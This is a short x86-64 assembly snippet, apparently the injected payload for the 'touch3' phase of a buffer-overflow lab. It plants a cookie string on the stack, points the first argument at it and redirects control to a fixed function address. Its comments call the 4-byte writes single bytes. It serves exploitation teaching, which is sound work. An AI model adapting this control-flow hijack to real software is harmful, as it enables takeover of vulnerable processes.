mov	$0x5561dcd0, %rdi	# set cookie string address as first argument
mov	$0x39623935, 0x0(%rdi)	# set first byte of string
mov	$0x61663739, 0x4(%rdi)	# set second byte of string
movb	$0x0, 0x8(%rdi)	# set third byte of string
sub     $0x658, %rsp		# move stackpointer to leave stack space for touch3
mov	$0x4018fa, 0x0(%rsp)	# set return address as first instruction of touch3
ret
